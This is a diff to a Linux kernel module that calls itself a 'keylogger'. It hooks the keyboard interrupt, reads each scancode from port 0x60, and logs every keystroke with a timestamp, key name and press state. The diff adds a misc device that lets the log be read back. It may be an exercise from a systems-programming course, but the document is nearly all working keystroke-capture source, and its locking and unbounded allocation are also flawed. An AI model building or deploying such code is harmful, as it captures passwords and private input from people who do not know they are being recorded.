@@ -1,13 +1,16 @@
 #include "keylog.h"
 #include "keymap.h"
-
+#include <linux/mutex.h>
 
 #define KEYBOARD_IRQ	1
 #define SHIFT_L		42
 #define SHIFT_R		54
 #define CAPS_LOCK	58
 
-#define BUF_SIZE PAGE_SIZE
+#define	MODULE_NAME	"keylogger"
+
+#define BUF_SIZE	PAGE_SIZE
+
 /*
 static struct s_stroke {
 	unsigned char		key;
@@ -28,91 +31,135 @@ struct keyboard_map {
 };
 
 */
+static unsigned char scancode;
+
+DEFINE_SPINLOCK(mr_lock);
+
 enum {
 	RELEASED,
 	PRESSED
 };
 
 struct list_head	head_stroke_lst_head;
+struct proc_dir_entry	*entry;
 char			line[BUF_SIZE];
 bool 			shift = 0;
 bool 			caps_lock = 0;
 
 LIST_HEAD(head_stroke_lst);
-/*			if (first) {
-				snprintf(buffer, 80, "%i:%i:%i: ",
-					strokes->time.tm_hour,
-					strokes->time.tm_min,
-					strokes->time.tm_sec);
-				strncat(line, buffer, 80);
-				memset(buffer, 0, 80);
-				first = 0;
-			}*/
-/*
-static int	chr_open(struct inode *node, struct file *file)
+
+
+int keylog_show(struct seq_file *seq_file, void *p)
 {
+	struct s_stroke		*strokes = NULL;
+
+	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
+	{
+		seq_printf(seq_file, "%i:%i:%i: %s (%d) %s\n",
+			   strokes->time.tm_hour,
+			   strokes->time.tm_min,
+			   strokes->time.tm_sec,
+			   strokes->name,
+			   strokes->key,
+			   strokes->state == RELEASED ? "RELEASED" : "PRESSED"
+			   );
+	}
 	return 0;
 }
 
-static int	chr_release(struct inode *node, struct file *file)
+static int keylog_open(struct inode *inode, struct file *file)
 {
+	int ret;
+
+	spin_lock(&mr_lock);
+	file->private_data = NULL;
+	ret = single_open(file, &keylog_show, NULL);
+	spin_unlock(&mr_lock);
+	return ret; 
+}
+
+static ssize_t	keylog_write(struct file *file, const char __user *buf,
+			  size_t size, loff_t *offset)
+{
+//	file->private_data = NULL;
 	return 0;
 }
 
-static ssize_t	chr_read(struct file *file, char __user *user,
-			 size_t size, loff_t *offset)
+static ssize_t keylog_read(struct file *file, char __user *buf, size_t size,
+			 loff_t *offset)
 {
-	return simple_read_from_buffer(user, size, offset, user, size);
+	int	ret;
+
+//	file->private_data = NULL;
+	spin_lock(&mr_lock);
+	ret = seq_read(file, buf, size, offset);
+	spin_unlock(&mr_lock);
+	return ret;
 }
 
-static struct file_operations const ops = {
-	.read = chr_read,
+static int keylog_release(struct inode *inode, struct file *file)
+{
+	int	ret;
+
+	spin_lock(&mr_lock);
+	ret = single_release(inode, file);
+	spin_unlock(&mr_lock);
+	return ret;
+}
+
+static struct file_operations const keylog_file_fops = {
+	.owner		= THIS_MODULE,
+	.open = keylog_open,
+	.write = keylog_write,
+	.read = keylog_read,
+	.release = keylog_release,
+	.llseek = seq_lseek,
 };
 
-static struct miscdevice misc = {
-	.minor = MISC_DYNAMIC_MINOR,
-	.name = "module_keyboard",
-	.fops = &ops
+static struct miscdevice		keylog_dev = {
+	MISC_DYNAMIC_MINOR,
+	MODULE_NAME,
+	&keylog_file_fops
 };
-*/
+
 static irqreturn_t keyboard_handler (int irq, void *dev_id)
 {
-	static unsigned char scancode;
 	struct s_stroke		*new;
 	struct timespec ts;
 	struct keyboard_map	*entry;
 
 	getnstimeofday(&ts);
-	new = kmalloc(sizeof(struct s_stroke), GFP_KERNEL);
+	spin_lock(&mr_lock);
+	scancode = inb (0x60);
+	spin_unlock(&mr_lock);
+	new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC);
 	if (new) {
-		scancode = inb (0x60);
 		new->key =  scancode & 0x7f;
 		entry = &keyboard_mapping[new->key];
 		memset(new->name, 0, sizeof(new->name));
 		memcpy(new->name, entry->str, strlen(entry->str));
 		new->state = (scancode & 0x80) ? RELEASED : PRESSED;
 		entry->pressed = new->state == PRESSED ? true : false;
+		caps_lock = entry->pressed && new->key == CAPS_LOCK ? !caps_lock : caps_lock;
 		shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
-		new->value = shift ? entry->shift_ascii : entry->ascii;
+		if (isalpha(entry->ascii))
+			new->value = shift == caps_lock ? entry->ascii : entry->shift_ascii; 
+		else
+			new->value = shift ? entry->shift_ascii : entry->ascii; 
 		time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
 		list_add(&new->stroke_lst, &head_stroke_lst);
 	}
+
 	return IRQ_HANDLED;
 }
 
-//		else if (((scancode & 0x7f) == CAPS_LOCK) && new->state == PRESSED) {
-//			caps_lock = (caps_lock == RELEASED) ? PRESSED : RELEASED;
-//		}
 static int __init keyboard_irq_init(void)
 {
 	int ret;
-//	int result;
 
-//	result = misc_register(&misc);
-//	if (result < 0) {
-//		pr_err("chr register failed for the driver.\n");
-//		return -1;
-//	}
+	ret = misc_register(&keylog_dev);
+	if (ret < 0) 
+		return -ENOMEM;
 	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
 			"keyboard", (void *)keyboard_handler);
 	if (ret) {
@@ -143,7 +190,7 @@ static void __exit keyboard_irq_exit(void)
 		kfree(strokes);
 	}
 	pr_err("%s\n", line);
-//	misc_deregister(&misc);
+	misc_deregister(&keylog_dev);
 	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
 }
 
